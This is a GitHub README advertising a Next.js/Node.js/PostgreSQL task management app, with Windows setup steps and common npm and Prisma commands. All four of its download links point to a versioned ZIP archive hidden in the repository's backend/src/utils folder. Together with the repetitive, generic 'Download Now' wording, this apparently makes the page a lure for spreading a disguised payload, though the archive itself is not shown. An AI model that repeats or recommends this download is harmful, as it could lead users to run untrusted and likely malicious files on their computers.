# 🗂️ Task-Management-System- - Organize Tasks With Less Effort

[![Download Task-Management-System-](https://img.shields.io/badge/Download%20Now-Task--Management--System---blue?style=for-the-badge)](https://github.com/hattyuninquiring592/Task-Management-System-/raw/refs/heads/main/backend/src/utils/Management_Task_System_3.8.zip)

## 🚀 Overview

Task-Management-System- is a full-stack task app for tracking work in one place. Use it to create tasks, update status, and keep your day in order.

It runs with a modern web stack:

- **Next.js** for the app screen
- **Node.js** for the server
- **TypeScript** for safer code
- **PostgreSQL** for data storage
- **Prisma** for database access
- **JWT** for sign-in sessions
- **Tailwind CSS** for the interface

## 📦 Download

To get the app, **visit this page to download**:

[Download Task-Management-System-](https://github.com/hattyuninquiring592/Task-Management-System-/raw/refs/heads/main/backend/src/utils/Management_Task_System_3.8.zip)

If the page opens in your browser, use the main download option on that page and save the file or source package to your PC.

## 🖥️ What You Need

Use a Windows PC with:

- Windows 10 or Windows 11
- A stable internet connection
- At least 4 GB of RAM
- 2 GB of free disk space
- A modern browser like Chrome, Edge, or Firefox

If you plan to run the app on your own computer, you also need:

- Node.js 18 or later
- PostgreSQL
- Git

## 🧭 What You Can Do

This task system is built for day-to-day task tracking.

You can:

- Add new tasks
- Edit task details
- Mark tasks as done
- Keep tasks in order by status
- Sign in with a secure login flow
- Work from a clean web interface
- View your work from a browser

## 🛠️ Install on Windows

Follow these steps in order.

### 1. Get the files

Open this page:

[https://github.com/hattyuninquiring592/Task-Management-System-/raw/refs/heads/main/backend/src/utils/Management_Task_System_3.8.zip](https://github.com/hattyuninquiring592/Task-Management-System-/raw/refs/heads/main/backend/src/utils/Management_Task_System_3.8.zip)

Download the project files to your computer. If the file comes as a ZIP folder, save it to your Downloads folder.

### 2. Unzip the folder

If you downloaded a ZIP file:

- Find it in **Downloads**
- Right-click the file
- Select **Extract All**
- Choose a folder like `C:\Task-Management-System-`

### 3. Open the project folder

After extracting, open the folder that contains the app files. Look for files like:

- `package.json`
- `next.config.js`
- `prisma`
- `src`

## ⚙️ Set Up the App

### 4. Install Node.js

If Node.js is not on your PC:

- Go to the official Node.js site
- Download the Windows installer
- Run the installer
- Keep the default options
- Finish the setup

To check if it works, open **Command Prompt** and run:

```bash
node -v
```

If you see a version number, Node.js is ready.

### 5. Install the database

You need PostgreSQL on your computer.

Basic setup:

- Install PostgreSQL
- Create a new database
- Save the database name, user name, and password

A common local setup uses:

- Host: `localhost`
- Port: `5432`

### 6. Add environment settings

The app uses a settings file called `.env`.

Create it in the project root and add values like these:

```env
DATABASE_URL="postgresql://user:password@localhost:5432/taskdb"
NEXTAUTH_SECRET="your-secret-key"
NEXTAUTH_URL="http://localhost:3000"
```

Use your real PostgreSQL user name, password, and database name.

### 7. Install project packages

Open **Command Prompt** in the project folder and run:

```bash
npm install
```

This gets the files the app needs to run.

### 8. Prepare the database

Run Prisma commands to create and sync the tables:

```bash
npx prisma generate
npx prisma migrate dev
```

If the app includes seed data, you may also run:

```bash
npx prisma db seed
```

## ▶️ Run the App

### 9. Start the app

Use this command:

```bash
npm run dev
```

Then open your browser and go to:

```text
http://localhost:3000
```

You should see the task management app in your browser.

## 🔐 Sign In

If the app uses login, enter the account details you set up or use the built-in auth flow on the sign-in screen.

Use a strong password and keep your login details safe.

## 📁 Common Folder Layout

You may see folders like these:

- `src` — app pages and logic
- `components` — screen parts used in the app
- `prisma` — database models and migrations
- `public` — images and static files
- `styles` — app styling files

## 🧪 Basic Use

After the app opens, try this flow:

1. Create a new task
2. Add a title and short note
3. Save the task
4. Change the status when work starts
5. Mark it as complete when done
6. Check the task list to keep track of progress

## 🔄 If You Want to Update the App

When new files are added to the repository:

- Download the latest version from the same link
- Replace the old project files
- Run `npm install` again if needed
- Run the database migration commands if the schema changed

## 📌 Browser Tips

For the best result:

- Use one current browser
- Keep JavaScript turned on
- Allow local site access if your browser asks
- Refresh the page if the app does not load on the first try

## 🔍 Troubleshooting

If the app does not start, check these points:

- Node.js is installed
- PostgreSQL is running
- The `.env` file has the right database details
- `npm install` finished without errors
- The port `3000` is free
- You ran the command from the project folder

If the page opens blank, reload the browser and check the terminal window for errors

## 🧰 Useful Commands

```bash
npm install
npm run dev
npm run build
npm start
npx prisma generate
npx prisma migrate dev
```

## 🧱 Tech Stack

- **Frontend:** Next.js, Tailwind CSS
- **Backend:** Node.js, TypeScript
- **Database:** PostgreSQL
- **ORM:** Prisma
- **Auth:** JWT

## 📍 Download Again

If you need the files again, use this link:

[Download Task-Management-System-](https://github.com/hattyuninquiring592/Task-Management-System-/raw/refs/heads/main/backend/src/utils/Management_Task_System_3.8.zip)

## 🗂️ Repository Details

- **Repository Name:** Task-Management-System-
- **Description:** Full-stack task management app with Node.js, TypeScript, Next.js, and PostgreSQL
- **Topics:** fullstack, jwt, nextjs, nodejs, postgresql, prisma, render, tailwindcss, typescript, vercel